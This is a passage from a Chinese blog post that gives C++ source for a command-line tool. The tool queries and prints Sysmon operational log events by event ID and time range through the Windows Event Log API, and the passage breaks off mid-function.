        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>Sysmon 官方文档： <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></li></ul><blockquote><p><a href="../../download/get_sysmon_event.zip">get_sysmon_event.exe 下载</a></p></blockquote><h2 id="C-源码"><a href="#C-源码" class="headerlink" title="C++ 源码"></a>C++ 源码</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/************************************************************************************************************* * get_sysmon_event.cpp *              * Sysmon 事件查询脚本，使用方法: *   ./get_sysmon_event.exe  *                          -limit 100                              : 一次查询的数量上限（可选，默认值100） *                          -id 1                                   : 事件类型（可选，默认值1） *                          -ts '2019-12-16T00:00:00.000000000Z'    : 查询开始时间（可选，默认无此条件） *                          -te '2019-12-16T08:00:00.000000000Z'    : 查询结束时间（可选，默认值为当前时间） *   *  ./get_sysmon_event.exe  *                          -limit 100   : 一次查询的数量上限（可选，默认值100） *                          -query str   : 查询字符串，语法形式形如： *    "Event/System[TimeCreated[@SystemTime&lt;'2019-12-16T08:00:00.000000000Z'] and TimeCreated[@SystemTime>'2019-12-05T00:00:00.000000000Z'] and EventID=3]" *  *************************************************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sddl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;locale.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winevt.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib, "wevtapi.lib") </span><span class="token comment" spellcheck="true">// winevt.h 库文件</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENTID_PROCESS_CREATE 1    </span><span class="token comment" spellcheck="true">// Sysmon事件ID: 进程创建</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENTID_NETWORK_CONNECT 3   </span><span class="token comment" spellcheck="true">// Sysmon事件ID: 网络连接</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_CHANNEL L"Microsoft-Windows-Sysmon/Operational"   </span><span class="token comment" spellcheck="true">// Sysmon事件管道名称</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_QUERY L"Event/System[EventID=1]"  </span><span class="token comment" spellcheck="true">// 系统事件查询条件语句</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_ITERATOR 10           </span><span class="token comment" spellcheck="true">// 单次迭代事件的个数</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_LIMIT 50              </span><span class="token comment" spellcheck="true">// 默认查询返回的事件数量上限</span><span class="token keyword">static</span> DWORD _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> EVENT_LIMIT<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 当前查询返回的事件数量上限</span>bool <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 检测字符串是否为空</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>LPWSTR <span class="token function">toLPWSTR</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// ASCII字符 -> 宽字符</span><span class="token keyword">void</span> <span class="token function">delUnASCII</span><span class="token punctuation">(</span>LPWSTR wstr<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 把非 ASCII 字符替换成 ?</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 根据脚本入参生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> eventId<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> startTime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 生成系统事件查询条件语句</span>DWORD <span class="token function">printEvents</span><span class="token punctuation">(</span>EVT_HANDLE hEvents<span class="token punctuation">,</span> DWORD limit<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 打印查询得到的系统事件列表</span>DWORD <span class="token function">printEvent</span><span class="token punctuation">(</span>EVT_HANDLE hEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印单个系统事件</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    LPWSTR channel <span class="token operator">=</span> EVENT_CHANNEL<span class="token punctuation">;</span>    LPWSTR evtQuery <span class="token operator">=</span> <span class="token function">toEvtQuery</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    EVT_HANDLE hEvents <span class="token operator">=</span> <span class="token function">EvtQuery</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> channel<span class="token punctuation">,</span> evtQuery<span class="token punctuation">,</span> EvtQueryChannelPath <span class="token operator">|</span> EvtQueryReverseDirection<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> hEvents<span class="token punctuation">)</span> <span class="token punctuation">{</span>        DWORD errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ERROR_EVT_CHANNEL_NOT_FOUND <span class="token operator">==</span> errId<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] The channel was not found: %s\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ERROR_EVT_INVALID_QUERY <span class="token operator">==</span> errId<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] The query is invalid: %s\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> evtQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtQuery failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printEvents</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">,</span> _evtLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">EvtClose</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// system("pause");</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 根据脚本入参生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> eventId <span class="token operator">=</span> EVENTID_PROCESS_CREATE<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> startTime <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> endTime <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> query <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-limit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>_evtLimit <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">?</span> EVENT_LIMIT <span class="token punctuation">:</span> _evtLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            eventId <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            eventId <span class="token operator">=</span> <span class="token punctuation">(</span>eventId <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> EVENTID_PROCESS_CREATE <span class="token punctuation">:</span> eventId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-ts"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            startTime <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-te"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            endTime <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-query"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            query <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">toLPWSTR</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token function">toEvtQuery</span><span class="token punctuation">(</span>eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> eventId<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> startTime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> endTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> evtQuery <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime>'%s'] and TimeCreated[@SystemTime&lt;'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime>'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime&lt;'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">toLPWSTR</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印查询得到的系统事件列表</span>DWORD <span class="token function">printEvents</span><span class="token punctuation">(</span>EVT_HANDLE hEvents<span class="token punctuation">,</span> DWORD limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    DWORD _iterNum <span class="token operator">=</span> <span class="token punctuation">(</span>EVENT_ITERATOR <span class="token operator">&lt;=</span> limit <span class="token operator">?</span> EVENT_ITERATOR <span class="token punctuation">:</span> limit<span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 累计迭代获得的事件数</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cnt <span class="token operator">&lt;</span> limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>        DWORD num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 本次迭代获得的事件数</span>        EVT_HANDLE<span class="token operator">*</span> evtCache <span class="token operator">=</span> new EVT_HANDLE<span class="token punctuation">[</span>_iterNum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 缓存</span>        <span class="token comment" spellcheck="true">// 提取事件列表</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">EvtNext</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">,</span> _iterNum<span class="token punctuation">,</span> evtCache<span class="token punctuation">,</span> INFINITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">!=</span> ERROR_NO_MORE_ITEMS<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtNext failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            delete<span class="token punctuation">[</span><span class="token punctuation">]</span> evtCache<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 迭代打印</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> cnt <span class="token operator">&lt;</span> limit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> cnt<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errId <span class="token operator">=</span> <span class="token function">printEvent</span><span class="token punctuation">(</span>evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">==</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">EvtClose</span><span class="token punctuation">(</span>evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        delete<span class="token punctuation">[</span><span class="token punctuation">]</span> evtCache<span class="token punctuation">;</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> errId<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 打印单个系统事件 *&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">  &lt;System>    &lt;Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>    &lt;EventID>1&lt;/EventID>    &lt;Version>5&lt;/Version>    &lt;Level>4&lt;/Level>    &lt;Task>1&lt;/Task>    &lt;Opcode>0&lt;/Opcode>    &lt;Keywords>0x8000000000000000&lt;/Keywords>    &lt;TimeCreated SystemTime="2019-12-17T10:26:56.242881800Z"/>    &lt;EventRecordID>50077&lt;/EventRecordID>    &lt;Correlation/>    &lt;Execution ProcessID="1280" ThreadID="1904"/>    &lt;Channel>Microsoft-Windows-Sysmon/Operational&lt;/Channel>    &lt;Computer>WIN-S1B6IAK3UN2&lt;/Computer>    &lt;Security UserID="S-1-5-18"/>  &lt;/System>  &lt;EventData>    &lt;Data Name="RuleName"/>    &lt;Data Name="UtcTime">2019-12-17 10:26:56.242&lt;/Data>    &lt;Data Name="ProcessGuid">{68E7DA22-AD70-5DF8-0000-0010428D1D01}&lt;/Data>    &lt;Data Name="ProcessId">16256&lt;/Data>    &lt;Data Name="Image">C:\\Program Files\\Sublime Text 3\\sublime_text.exe&lt;/Data>    &lt;Data Name="FileVersion">3188&lt;/Data>    &lt;Data Name="Description">Sublime Text&lt;/Data>    &lt;Data Name="Product">Sublime Text&lt;/Data>    &lt;Data Name="Company">Sublime HQ Pty Ltd&lt;/Data>    &lt;Data Name="OriginalFileName">sublime_text.exe&lt;/Data>    &lt;Data Name="CommandLine">"/C/Program Files/Sublime Text 3/sublime_text.exe" "--crawl" "14516:crawl:11"&lt;/Data>    &lt;Data Name="CurrentDirectory">C:\\Program Files\\Sublime Text 3\\&lt;/Data>    &lt;Data Name="User">WIN-S1B6IAK3UN2\\Administrator&lt;/Data>    &lt;Data Name="LogonGuid">{68E7DA22-383A-5DF8-0000-0020CBFF0200}&lt;/Data>    &lt;Data Name="LogonId">0x2ffcb&lt;/Data>    &lt;Data Name="TerminalSessionId">2&lt;/Data>    &lt;Data Name="IntegrityLevel">High&lt;/Data>    &lt;Data Name="Hashes">SHA256=450AD9A507403C5A3BA42DC6E1910E84E886200AFD190BF4B0B5B95FC066F7E1&lt;/Data>    &lt;Data Name="ParentProcessGuid">{68E7DA22-A908-5DF8-0000-0010A0B40F01}&lt;/Data>    &lt;Data Name="ParentProcessId">14516&lt;/Data>    &lt;Data Name="ParentImage">C:\\Program Files\\Sublime Text 3\\sublime_text.exe&lt;/Data>    &lt;Data Name="ParentCommandLine">"C:\\Program Files\\Sublime Text 3\\sublime_text.exe"&lt;/Data>  &lt;/EventData>&lt;/Event> */</span>DWORD <span class="token function">printEvent</span><span class="token punctuation">(</span>EVT_HANDLE hEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    DWORD dwBufferSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwBufferUsed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwPropertyCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    LPWSTR pRenderedContent <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">EvtRender</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hEvent<span class="token punctuation">,</span> EvtRenderEventXml<span class="token punctuation">,</span> dwBufferSize<span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBufferUsed<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwPropertyCount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">==</span> ERROR_INSUFFICIENT_BUFFER<span class="token punctuation">)</span> <span class="token punctuation">{</span>            dwBufferSize <span class="token operator">=</span> dwBufferUsed<span class="token punctuation">;</span>            pRenderedContent <span class="token operator">=</span> <span class="token punctuation">(</span>LPWSTR<span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>dwBufferSize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">EvtRender</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hEvent<span class="token punctuation">,</span> EvtRenderEventXml<span class="token punctuation">,</span> dwBufferSize<span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBufferUsed<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwPropertyCount<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] malloc failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>                errId <span class="token operator">=</span> ERROR_OUTOFMEMORY<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">!=</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtRender failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">delUnASCII</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"%ls\n"</span><span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"==================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> errId<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 检测字符串是否为空</span>bool <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> 